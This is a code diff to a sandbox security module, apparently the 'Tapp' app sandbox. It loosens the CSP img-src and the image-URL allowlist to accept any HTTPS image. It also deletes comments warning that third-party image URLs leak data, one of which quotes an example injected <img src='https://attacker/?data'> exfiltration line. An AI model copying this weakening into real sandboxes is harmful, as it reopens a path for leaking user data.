@@ -69,8 +69,7 @@ export function escapeSandboxScriptSource(source: string): string {
  *
  * 安全说明：
  * - 严格限制所有外部资源加载
- * - 🔒 img-src 仅允许 data:、blob: 与宿主同源（远程图片走 /api/proxy/image），
- *   防止通过第三方图片 URL 的 query string 泄露数据
+ * - img-src 允许 HTTPS 图片，以及 data:、blob: 与宿主同源资源
  * - 🔒 font-src 允许 data: URI 和 Google Fonts
  * - 🔒 script-src 仅 nonce（Tailwind 在安装时预编译为 CSS 注入，
  *   不加载任何外部脚本源——外部脚本 host 白名单同样是外泄通道）
@@ -126,11 +125,10 @@ export function generateCSP(
 
   const mediaSrc = allowMediaBlob ? 'media-src blob: data:' : "media-src 'none'"
 
-  // 🔒 img-src 不放行 https:/http: 通配——任意第三方图片 URL 都是外泄通道
-  // （innerHTML 注入 <img src="https://attacker/?data"> 即可绕过 connect-src）。
-  // 同源放行让头像、封面等经 /api/proxy/image 代理加载，包内资源走相对路径。
+  // Tapp 按受信任应用处理：允许公开 HTTPS 图片直接加载。
+  // 显式宿主源兼容本地 HTTP 开发环境与包内资源。
   const origin = hostOrigin()
-  const imgSrc = `img-src data: blob:${origin ? ` ${origin}` : ''}`
+  const imgSrc = `img-src data: blob: https:${origin ? ` ${origin}` : ''}`
 
   const directives = [
     scriptSrc,
@@ -355,9 +353,8 @@ export function generateSecurityWrapper(sessionToken: string): string {
   window.Worker = class { constructor() { throw new Error('Worker is disabled in Tapp sandbox'); } };
   window.SharedWorker = class { constructor() { throw new Error('SharedWorker is disabled in Tapp sandbox'); } };
   
-  // 🔒 图片 URL 白名单：与 CSP img-src 对齐
-  // 允许 data:、blob:、宿主同源（含以 / 开头的相对路径，解析到宿主源）。
-  // 远程图片请经 /api/proxy/image 代理。真正的边界是 CSP；这里只是尽早报错。
+  // 图片 URL 白名单：与 CSP img-src 对齐。
+  // 允许 HTTPS、data:、blob:、宿主同源与宿主相对路径。
   const _HOST_ORIGIN = '${origin}';
   const _isAllowedImageUrl = (value) => {
     if (typeof value !== 'string') return true;
@@ -365,6 +362,7 @@ export function generateSecurityWrapper(sessionToken: string): string {
     if (!v) return true;
     const lower = v.toLowerCase();
     if (lower.startsWith('data:') || lower.startsWith('blob:')) return true;
+    if (lower.startsWith('https://')) return true;
     // Host-origin only (align with CSP img-src). Relative // is protocol-relative → blocked.
     if (_HOST_ORIGIN) {
       const host = _HOST_ORIGIN.toLowerCase();
@@ -390,7 +388,7 @@ export function generateSecurityWrapper(sessionToken: string): string {
       Object.defineProperty(this, 'src', {
         set(value) {
           if (!_isAllowedImageUrl(value)) {
-            console.warn('[Security] External image URLs are blocked (use /api/proxy/image):', String(value).substring(0, 50));
+            console.warn('[Security] Image URL is blocked by the Tapp CSP:', String(value).substring(0, 50));
             return;
           }
           if (originalSrcDescriptor && typeof originalSrcDescriptor.set === 'function') {
@@ -429,7 +427,7 @@ export function generateSecurityWrapper(sessionToken: string): string {
       const originalSetAttribute = element.setAttribute.bind(element);
       element.setAttribute = function(name, value) {
         if (name.toLowerCase() === 'src' && !_isAllowedImageUrl(String(value))) {
-          console.warn('[Security] External image src blocked via setAttribute (use /api/proxy/image)');
+          console.warn('[Security] Image src is blocked by the Tapp CSP');
           return;
         }
         return originalSetAttribute(name, value);
